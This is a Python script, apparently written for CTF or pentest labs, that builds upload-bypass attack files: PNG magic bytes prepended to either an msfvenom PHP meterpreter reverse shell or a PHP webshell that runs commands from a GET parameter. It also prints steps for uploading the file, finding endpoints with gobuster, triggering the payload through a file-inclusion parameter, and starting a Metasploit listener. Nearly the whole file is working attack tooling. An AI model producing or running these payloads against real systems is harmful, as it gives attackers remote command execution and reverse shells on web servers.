#!/usr/bin/env python3
"""
Helper script to generate msfvenom PNG payloads for testing the upload functionality.
This script creates PNG files with embedded PHP reverse shell payloads.
"""

import subprocess
import sys
import os

def generate_msfvenom_png(lhost, lport, output_file="shell.png"):
    """
    Generate a PNG file with embedded PHP meterpreter reverse shell using msfvenom.
    """
    print(f"Generating msfvenom PNG payload...")
    print(f"LHOST: {lhost}")
    print(f"LPORT: {lport}")
    print(f"Output: {output_file}")
    
    # Generate the PHP payload first
    php_payload_cmd = [
        "msfvenom",
        "-p", "php/meterpreter_reverse_tcp",
        f"LHOST={lhost}",
        f"LPORT={lport}",
        "-f", "raw"
    ]
    
    try:
        # Generate PHP payload
        result = subprocess.run(php_payload_cmd, capture_output=True, text=True)
        if result.returncode != 0:
            print(f"Error generating payload: {result.stderr}")
            return False
        
        php_payload = result.stdout
        
        # Create PNG with embedded PHP payload
        # PNG magic bytes followed by PHP code
        png_magic = b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A'  # PNG signature
        
        # Add some minimal PNG structure to make it look more legitimate
        png_header = png_magic
        php_code = f"<?php {php_payload} ?>".encode()
        
        # Write the combined file
        with open(output_file, 'wb') as f:
            f.write(png_header)
            f.write(php_code)
        
        print(f"Successfully created {output_file}")
        print(f"File size: {os.path.getsize(output_file)} bytes")
        print("\nCTF/Pentest Instructions:")
        print("1. Upload this PNG file through the web interface")
        print("2. Use gobuster to discover hidden endpoints:")
        print("   gobuster dir -u http://target/ -w /usr/share/wordlists/dirb/common.txt")
        print("3. Look for admin.php, config.php, backup.php, debug.php, test.php")
        print("4. Execute payload via: admin.php?file=<uploaded_path>")
        print(f"5. Set up listener: msfconsole -q -x 'use multi/handler; set payload php/meterpreter_reverse_tcp; set lhost {lhost}; set lport {lport}; run'")
        
        return True
        
    except subprocess.CalledProcessError as e:
        print(f"Error running msfvenom: {e}")
        return False
    except Exception as e:
        print(f"Error creating payload: {e}")
        return False

def generate_simple_webshell_png(output_file="webshell.png"):
    """
    Generate a simple PNG with embedded PHP webshell for testing.
    """
    print(f"Generating simple webshell PNG: {output_file}")
    
    # PNG magic bytes
    png_magic = b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A'
    
    # Simple PHP webshell
    php_code = b'<?php if(isset($_GET["cmd"])) { system($_GET["cmd"]); } ?>'
    
    # Write the combined file
    with open(output_file, 'wb') as f:
        f.write(png_magic)
        f.write(php_code)
    
    print(f"Successfully created {output_file}")
    print(f"File size: {os.path.getsize(output_file)} bytes")
    print("\nCTF/Pentest Instructions:")
    print("1. Upload this PNG file through the web interface")
    print("2. Use gobuster to discover hidden endpoints:")
    print("   gobuster dir -u http://target/ -w /usr/share/wordlists/dirb/common.txt")
    print("3. Look for admin.php, config.php, backup.php, debug.php, test.php")
    print("4. Execute webshell via: admin.php?file=<uploaded_path>&cmd=<command>")
    print("5. Example: admin.php?file=2024-09-29_a1b2c3d4/e5f6_webshell.png&cmd=whoami")
    
    return True

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Msfvenom PNG Payload Generator for CTF/Pentest")
        print("=" * 50)
        print("Usage:")
        print(f"  {sys.argv[0]} webshell [output.png]           # Generate simple webshell PNG")
        print(f"  {sys.argv[0]} reverse <LHOST> <LPORT> [output.png]  # Generate msfvenom reverse shell PNG")
        print("\nExamples:")
        print(f"  {sys.argv[0]} webshell shell.png")
        print(f"  {sys.argv[0]} reverse 10.10.14.5 4444 reverse.png")
        sys.exit(1)
    
    if sys.argv[1] == "webshell":
        output = sys.argv[2] if len(sys.argv) > 2 else "webshell.png"
        generate_simple_webshell_png(output)
        
    elif sys.argv[1] == "reverse":
        if len(sys.argv) < 4:
            print("Error: reverse shell requires LHOST and LPORT")
            print(f"Usage: {sys.argv[0]} reverse <LHOST> <LPORT> [output_file]")
            sys.exit(1)
        
        lhost = sys.argv[2]
        lport = sys.argv[3]
        output = sys.argv[4] if len(sys.argv) > 4 else "reverse_shell.png"
        
        generate_msfvenom_png(lhost, lport, output)
        
    else:
        print(f"Unknown command: {sys.argv[1]}")
        print("Use 'webshell' or 'reverse'")
        sys.exit(1)
